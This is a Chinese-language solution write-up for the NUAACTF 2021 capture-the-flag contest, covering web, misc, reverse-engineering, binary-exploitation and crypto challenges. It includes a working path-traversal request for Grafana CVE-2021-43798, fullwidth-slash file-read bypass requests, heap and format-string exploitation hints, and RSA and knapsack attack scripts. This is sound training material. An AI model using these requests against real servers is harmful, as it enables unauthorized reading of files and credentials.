[TOC]  

# Web  

##	真的签到 (28 solves)

###	exp

参考答案，请求：`/public/plugins/welcome/../../../../../../../../home/grafana/flag`

###	考点

作为从事信息安全方向的人员，不论是在哪一个企业，对于漏洞的敏感度都肯定需要异于常人，需要日常更新自己的漏洞库知识，哪怕有一点印象都可以，毕竟现在是互联网时代，详情可以在网络上搜索得到，获取信息不能太滞后。

这个题主要是想考察信息安全的同学对于近期 Web 漏洞的关注度，这个 Web 漏洞就是 CVE-2021-43798 （这是一个漏洞编号），这个漏洞在 2021/12/07 号左右在互联网上被披露，NUAACTF 是 2021/12/11 ，日子比较接近，也符合我想考察地同学们对于 Web 漏洞跟进的能力。并且为了降低整体比赛难度，减轻同学们的压力，所以没有设置其他特别复杂的漏洞。

（问题来了，为啥不用 12/09 晚上爆出的 Log4j 漏洞呢？因为忙不过来，环境弄不过来2333

##	Make Me Cry (0 solves)

###	exp

参考答案，向 /flag 路由发送以下内容即可

```
POST /flag HTTP/1.1
Host: 118.195.147.196:9216
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

/.／flag
```

###	解题步骤

* 第一步，访问主页，我们可以看到主页列举了当前面目录下的一些文件，

  ```
  你好世界！我做了一个简单的服务器，我经常访问 /flag 路径来读取我需要的文件。这是我当前目录下的文件: ["main", "main.cr", "test.txt", "flag"]
  ```

* 根据题目的描述，我们知道 /flag 路径可能存在**任意文件读取漏洞**，那我们尝试访问 /flag 路径，得到提示

  ```
  你想要 FLAG 吗？尝试向我发送 POST 请求你想要读取的文件名吧，直接发送文件名噢，不需要其他参数。
  ```

* 所以根据描述，我们可以直接向该路由发送一个 POST 参数，例如我们先尝试读取 test.txt

  ```http
  POST /flag HTTP/1.1
  Host: 118.195.147.196:9216
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 8
  
  test.txt
  ```

  我们可以得到 HTTP 响应：

  ```http
  HTTP/1.1 200 OK
  Connection: keep-alive
  Content-Type: text/plain; charset=utf-8
  Content-Length: 87
  
  检查一下是否可以正常读取文件但是不能让坏家伙读我的小秘密。
  ```

* 尝试读取 flag 文件

  ```http
  POST /flag HTTP/1.1
  Host: 118.195.147.196:9216
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 4
  
  flag
  ```

  得到如下 HTTP 响应，得知我们不能直接读取 flag ，所以我们可能得需要找个方法读取 flag

  ```http
  HTTP/1.1 200 OK
  Connection: keep-alive
  Content-Type: text/plain; charset=utf-8
  Content-Length: 27
  
  You can't get flag directly
  ```

* 当然你可以尝试读取其他目录文件，比如 `/etc/passwd` ，但是读不了，这里就不做演示了，会提示没有找到该文件，我们这里直接读取 main.cr 代码。

* 读取到代码之后就是代码审计的部分了，简单通过阅读了解，我们知道这是 crystal 语言写的 Web 服务，并且通过搜索，代码并不多，简单学习[ crystal 语言的文档](https://crystal-lang.org) 我们可以知道这是一个比较新兴的类 ruby 类型的语言。为了方便同学们理解代码，我简单写了一下注释

```ruby
# A very basic HTTP server
require "http/server"
def normalize(data)												#定义一个函数
	tmp = ""													#定义一个变量
	data.each_char do |char|									#对 data 这个字符串变量进行挨个循环处理
		if 65374 >= char.ord >= 65281							#如果这个字符对应的十进制在 [65281,65374] 这个区间
			tmp += (char.ord - 65248).chr						#进行减法，并再返回减法后对应的字符。并拼接上 tmp 变量原有的字符串
		elsif 126 >= char.ord >= 33								#如果这个字符对应的十进制在 [33,126] 这个区间
			tmp += char											#直接拼接上 tmp 变量原有的字符串
		end
	end
	return tmp													#返回 tmp 字符串变量
end

server = HTTP::Server.new do |context|
	context.response.content_type = "text/plain; charset=utf-8"	#设置 HTTP 响应头部
	if context.request.path == "/flag"							#访问 /flag 路径做以下操作
		if context.request.method == "POST"						#如果是 POST 请求做以下操作
			begin												# begin 关键字是 crystal 错误捕捉机制，可以理解为 try/catch
				filename = context.request.body.not_nil!.gets_to_end	#获取 POST 正文的内容
				filename = File.basename filename				#将 filename 作为参数传递给 File.basename 函数，该函数用来获取基础文件名，例如传入 /etc/passwd 会返回 passwd
				filename = normalize filename					#使用 normalize 函数对 filename 变量进行处理
                if File.match?("*fl*", filename)				#使用 File.match 函数对 filename 变量进行 *fl* 正则匹配
					context.response.print "You can't get flag directly"  #如果正则匹配上了对应内容，则返回错误的 HTTP 响应
				else
					data = File.read(filename)					#如果不匹配，则使用 File.read 函数读取对应的文件内容
					context.response.print data					#将文件内容作为 HTTP 响应返回
				end    
			rescue
				context.response.print "File not Found"			# rescue 关键字捕捉到错误后，则将这行字符串作为 HTTP 响应返回
			end
		else
			context.response.print "你想要 FLAG 吗？尝试向我发送 POST 请求你想要读取的文件名吧，直接发送文件名噢，不需要其他参数。"
		end
	elsif context.request.path == "/"
		dir = Dir.children("/app/").to_s
		context.response.print "你好世界！我做了一个简单的服务器，我经常访问 /flag 路径来读取我需要的文件。这是我当前目录下的文件: " + dir
	end
end

server.bind_tcp "0.0.0.0", 80	#让 HTTP 服务监听在 80 端口上
server.listen					#启动 HTTP 服务
```

我们可以根据提示或者理解 `normalize` 函数知道，这个函数中对于十进制大于 65281 的处理，是为了解决全角字符的问题，这里使用了简单粗暴的方法，将全角字符转换成了半角字符，我们可以通过百度百科的表格看出来：https://baike.baidu.com/item/%E5%85%A8%E8%A7%92/9323113?fr=aladdin

| **ASCII** | **全角字符** | **Unicode** | **半角字符** | **Unicode** |
| --------- | ------------ | ----------- | ------------ | ----------- |
| 0x2f      | /            | U+ff0f      | /            | U+002f      |

上面这个例子，左边这个斜杠的全角字符 0xff0f 对应的十进制就是 65295 ，右边半角字符对应的则是 47 ，所以 65295-47=65248 ，所以正好是`normalize`函数使用的数值，就是为了将全角字符转换为半角字符。

知道`normalize`函数具体用来干什么之后，我们回到正则表达式处的代码，这里使用`*fl*`，表示匹配中间有 fl 两个字符的所有字符串，比如 xflag / flag 等，如果匹配到了则会拒绝用户请求，匹配不上则会进行读取相应的文件。但是已知我们当前目录下存在 flag 文件，那么我们有没有办法，让这个正则表达式匹配不上，让其读取 flag 文件呢？

阅读 `File.match` 这个函数文档，或者根据提示我们可以从文档中知道

> \* matches an unlimited number of arbitrary characters excluding `/`
>
> Only `/` is recognized as path separator in both *pattern* and *path*.

这句话的意思是，对于 * 星号来说，这里比较特殊，一般正则表达式星号会匹配任意字符，但是这里文档标明了，星号不会匹配斜杠这个字符，所以当我们如果传入`./flag`的时候，`File.match`这个函数就匹配不上了，就会进入到`File.read(filename)`函数进行文件读取，而`./flag`表示当前目录下的 flag 文件，所以就可以拿到 flag 了。

看到这里你是不是以为就可以了呢？当你尝试使用`./flag`的时候会发现，`File.basename`将`./flag`转换成了`flag`去掉了我们后面需要的斜杠。

看到这里你是不是以为又不可以了呢？我们看回`normalize`函数，并且注意到`File.basename`函数是在`normalize`函数之前，那我们是不是可以使用一个全角字符绕过`File.basename`函数呢？因为对于一般情况下来说，全角字符会被视为一般的字符串，比如上面的斜杠对应的全角字符，他在这里不会被视为斜杠，而会被视为一个普通的看起来像斜杠一样的字符串，所以`File.basename`不会将其视为半角的斜杠，就不会把他去掉了。

然后经过`File.basename`处理后的全角字符会经过`normalize`函数变成半角字符的斜杠！这样传入到`File.match`函数的时候就是半角字符的斜杠了！我们就可以绕过正则表达式的检测了！好耶！

所以我们直接复制全角字符的斜杠放到 burp 里面发送就好啦，是不是很简单呢？只需要一行代码哎

![](https://s4.ax1x.com/2021/12/15/oxzjpT.png)



###	考点

* crystal lang 。新语言的快速学习能力以及查阅文档能力
* 基础的正则表达式。
* 代码审计能力

这个题我的预期是校外队伍可能会有 1-5 支队伍应该可以做出来，校内比较悬，但是即使最后在给到了文档详细位置的地方还是没有人做出来让我有些意外。

我认为代码审计能力对于任何一个方向的安全从业者来说，都是必备的能力之一；虽然这个 crystal lang 比较冷门，但是正是冷门，大家都没学过，才能考察出大家对于新语言的快速学习能力，文档阅读能力，我觉得这也是**竞赛**的目的之一，就是为了锻炼、考察选手的能力，而且这几个考点基本上都是阅读文档都能找到的，所以并不算特别的难（今后的竞赛道路还远呢，竞赛题会更险恶）。

所以，我也希望大家在精进代码能力的同时，不要忘了语言毕竟是工具，吃透一门语言当然好，但是一门语言并不会永远都是热门，以后可能在工作、学习上需要你去接触其他语言，一些热门语言还好，有成熟的文档、完善的社区生态，要是冷门语言该怎么办？要是这个语言甚至没有文档怎么办？摆烂直接弃用当然是一种解决方式，但是如果真到了不能弃用的地步，那你会怎么去解决这个问题呢？

题目归题目，希望大家在今后的竞赛生涯中，不要死背考点，真正的 CTF 并不像寻常考试一样会有一些常考的热门考点，反而更多偏向于考察选手快速学习的能力，出题人很有可能就像这个题一样出一个你从来没见过的东西，让你在短期学习掌握一些知识解决这个问题，这也是 CTF 的乐趣所在。

Anyway，祝贺本次竞赛取得优异成绩的队伍，暂时落后的队伍也不必灰心，希望各位选手能从本次的竞赛中有所收获~

# Misc

## 我们生活在南京（一）

用 Audacity 反转声音即可。

## 我们生活在南京（二）

根据提示，发现程序中被插入了高频正弦波，可以算出来频率是 1000Hz，添加一个相位相反的新正弦波抵消即可。

## 我们生活在南京（三）

根据提示，发现 `NU` 后面的字符都比特翻转了，还原即可，之后得到一个音频文件，还是根据提示可以知道国际空间站常用 PD-120 模式发送 SSTV，用相应的软件（比如 Robot36）解码即可。

# Rev  

## Legende Lof Links
其实题目里面藏了一个`LLL`在里面  

### 逆向分析
程序运行起来的时候，能够看到一些奇怪的截图  
![](./img/nazo05.png)   

分析找到这个逻辑:  
![](./img/nazo02.png)   
这些字符看起来有点奇怪，进行凯撒加密之后能够解开:
```
legends keywords
```
可以看到这边给了一串数字`6421025468326853`，这个数字可以在代码中搜到:  
![](./img/nazo04.png)   
虽然从
可以看到是一个匹配的逻辑
```cpp
char __thiscall check_value(__m128i **this, int a2, int a3)
{
  __m128i *v3; // edi
  __m128i *v4; // ecx
  unsigned int v5; // edx
  unsigned int i; // esi
  unsigned __int64 v7; // kr00_8
  int v9; // eax

  v3 = this[1];
  v4 = *this;
  v5 = 0;
  for ( i = 0; v4 != v3; v4 = (__m128i *)((char *)v4 + 24) )
  {
    v7 = __PAIR64__(_mm_cvtsi128_si32(_mm_srli_si128(*v4, 12)), _mm_cvtsi128_si32(_mm_srli_si128(*v4, 8)))
       + __PAIR64__(v5, i);
    v5 = HIDWORD(v7);
    i = v7;
  }
  if ( i == a2 && v5 == a3 )
    return 1;
  v9 = sub_402220(std::cout, "Have fun!");
  std::ostream::operator<<(v9, sub_4025C0);
  return 0;
```
从逻辑上看可以看出来，这边再进行一个类似累加的过程。（从汇编可以看出来，本质上压入的是一个长数字，但是这边将数字分成了两个不同的数字压入栈中）  
结合当前函数的外部，可以推测此题 **企图让某些地方的值加起来等于这个总数**。

简单玩一下游戏，或者直接去翻找资源文件能发现，游戏刚开始就往下走能够走到一个奇怪的地图
![](./img/nazo06.png)  
这个地图的构造是一个 **8*5大小的格子方块组成，其中每一行8个格子**。找到对应的地图文件，叫做nazo.tmx，使用工具`TiledMap`打开后看到如下图:  
![](./img/nazo00.png)  
会发现这里面的每一个对象身上都带有一个叫做`value`的值。于是可以猜测，这边的怪物身上的值会以某种形式传入到那个`check_value`函数中，于是在函数中下断点调试，跟到这一步
![](./img/nazo10.png)  
此处能够发现，这个地方
这个值分析程序主要逻辑之后，能够发现程序尝试读取这个地方的数值，并且用eax和esi分别存储高位和低位，结合逆向分析可知此时为一个大数加法运算。  

### 算法解密
结合题目提到，不小心把公钥生成脚本上传上去，可以知道这个`nazo.tmx`中包含的正是彩蛋解密用的密钥。分析脚本可知是一个密码学中的常见背包问题，可通过LLL算法计算出最短向量来进行解密。（其中题目中也有暗示这个算法）脚本本身也很容易在网上搜到对应的解密脚本，于是将对应资源文件中的数据读取出来之后，可以结合逆向分析的结果，直接写出对应的解密脚本:
```python
pubKey = [288987930484713, 340150388569723, 775832214910355, 216867890037121, 501352569419409, 318822438792492, 158678987418047, 103047289635008, 232924311836164, 825277525877592, 266171732738326, 232058805490403, 503492576572133, 361556090493722, 185759789132988, 141839477664327, 548824923286652, 13387599878646, 459796431386589, 353077318969337, 511286054037178, 57089108809875, 584998735988633, 284676495083131, 800281594291554, 371509900212370, 392227033009677, 840774125862985, 195657954859337, 509931569484802, 159469040461778, 809855051248225, 459522106994522, 605887145649518, 508449489953120, 836314895545713, 244798820584214, 467004182165356, 381450144739742, 581067701595314]

nbit = len(pubKey)
S = 6421025468326853  

print("start")
# create a large matrix of 0's (dimensions are public key length +1)
A = Matrix(ZZ,nbit+1,nbit+1)
# fill in the identity matrix
for i in range(nbit):
    A[i,i] = 1
# replace the bottom row with your public key
for i in range(nbit):
    A[i,nbit] = pubKey[i]
# last element is the encoded message
A[nbit,nbit] = -S

res = A.LLL()
resfil = open("res.txt", 'w')
# print(res)
resfil.write(str(res))

res = A.LLL()
for i in range(0, nbit + 1):
    # print solution
    M = res.row(i).list()
    flag = True
    for m in M:
        if m != 0 and m != 1:
            flag = False
            break
    if flag:
        print(i, M)
        M = ''.join(str(j) for j in M)
        # remove the last bit
        M = M[:-1]
        M = hex(int(M, 2))[2:-1]
        print(M)
```
密钥解密逻辑  
![](./img/nazo07.png)  
拿到对应的序列之后，可以直接按照对应的序列打死怪物，然后打死boss获取彩蛋。或者通过逆向，找到打死boss之后的逻辑:  
![](./img/nazo08.png)  
可以看到当前在一个程序的全局变量上读取了大段的数据，并且调用解密函数。分析特征可知是一个AES-256-cbc加密，于是最终可写出解密脚本，最终解密得到的`flag.tmx`为  
![](./img/nazo11.png)

## Warm up

一个很简单的逆向，看[源码](./rev/Warm%20up/xor.c)可知只是在 construct 过程中加了另一个异或和反调试。

## Destroyed ELF

首先修复 ELF Program Header，自己随便编译一个 elf 文件进行对照（比如 hello world，一般来说Ubuntu 20.04 和 18.04 的 gcc 都行）：

``` c
#include <stdio.h>

int main()
{
    return 0;
}
```

首先修复 magic word，修复之后打开会发现报错：

```
ELF file with PHT cannot be ET_REL
```

接下来就修复该字段为 0x3。

接着发现报错

The PHT overwrites previously loaded segments with different file contents.
Although the OS will likely succeed in loading this file,
we recommend you to analyze this file's PHT.

继续与自己编译出来的 binary 对比，发现 elf header size 也不正确，修改之。

接下来 IDA 就能正常解析了。

然后发现 start 函数只会输出错误的 flag，发现入口点被修改了，对比自己编译的binary，发现正常的位置在 0x1040 左右，而这个文件中的 start 函数位于 151F。向前追溯到 text 段开头，将 0x10e0 位置的代码 convert 并 create function 得到正确的 start 函数。接着将 header 中的 entry point 指向 0x10e0。

然而此时的 main 函数仍不正确，不过我们可以用多种方法定位 main 函数，这里找到 main 函数的地址是 0x15DF，create function 之后就可以正常逆向了。我们也可以将 start 中的main函数指向正确的位置。

接着会发现代码是先对 ELF Header 算了个哈希然后和 flag 异或，再和一个全局变量比较。动态调试获取哈希值然后和全局变量异或即可得到 flag。

注：这道题手动 patch 了几个位置，src 中提供的源码编译出来和题目不一致是正常现象。

# PWN
## format
格式化字符串
flag读入到了栈上
输入%7$s 即可读出flag
## thread
在sale_handler中存在sleep, 所以一个货品卖掉会先加钱过1s再清空数量, 买1份 卖两次就行了

## leaf
在二叉查找树的合并过程中存在UAF漏洞, 具体就是exchang中父亲的ch指针没有清空, check是short类型的, 构造堆然后orw即可

## tiny
多次调用alarm(sys_alarm)会返回剩余时间，在剩余2秒的时候调用sys_alarm，控制rax，调用sys_open

## can’t leak
利用unsortedbin残留指针申请到stdout->fileno,修改为2通过stderr流输出，泄露[‘environ’]得到栈地址，写orw
## nohook
每次edit后会检查free_hook和malloc_hook，不为空则清空，利用tcache->system，free(malloc_hook)来向malloc_hook写入system地址。或者打IO_FILE

## tanchishe
就一个输入点，不用逆向直接打，input函数会使得rop被复制到堆上，注意不破坏topsize就行

# Crypto

## checkin

1. 题目给出了加密函数，根据给出的a获取其乘法逆元。

```
(11n) mod 26 = 1
n = 19
```

2. 编写脚本解密，最后加上`{}_`即可。

```python
m = r"oclzloovydvblbvnucdhqpumj"
flag = ""

for i in m:
    flag += chr(((19 * (ord(i) - 0x61 - 11)) % 26) + 0x61)

print(flag)
```

## guessgame

```python
from pwn import * 
POST = 'ctf.asuri.club' 
HOST = '10000' 
r = remote(POST, HOST) 
for i in range(50-7): 
  r.sendline("1") 
for i in range(7):
  r.sendline("0") 
r.interactive()
```

## numbers



## easyRSA

根据题目给出的程序容易看出是RSA的共模攻击，最终exp。

```python
# coding=utf-8
import string
import gmpy
from rsa import transform,core
from Crypto.Util.number import long_to_bytes

def egcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        g, y, x = egcd(b % a, a)
        return g, x - b // a * y, y
def main():
    file1 = open("flag.enc1" ,'rb').read()
    c1 = transform.bytes2int(file1)

    file2 = open("flag.enc2" ,'rb').read()
    c2 = transform.bytes2int(file2)

    n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929
    e1 = 17
    e2 = 65537
    s = egcd(e1, e2)
    s1 = s[1]
    s2 = s[2]

    if s1 < 0:
        s1 = -s1
        c1 = gmpy.invert(c1, n)
    elif s2 < 0:
        s2 = -s2
        c2 = gmpy.invert(c2, n)

    m = pow(c1, s1, n) * pow(c2, s2, n) % n
    print(str(long_to_bytes(m)))

if __name__ == '__main__':
    main()

#flag{number_is_very great}

```

## MLWE

Kyber是一个格密码算法，基于Module-LWE问题，是目前NIST标准热门候选算法。

因为尚未制定为标准，因此没有公开的test vectors，按照算法团队提供的参考实现就行。

所以直接给了算法的参考实现，密文ct和私钥sk，都是base64编码了一下。

所以decode到memory之后直接调用`indcpa_dec`即可。

源码链接：https://github.com/pq-crystals/kyber

题目hint：Kyber768 CPA PKE

flag{b138c574d2039fc2}

exp在附件中
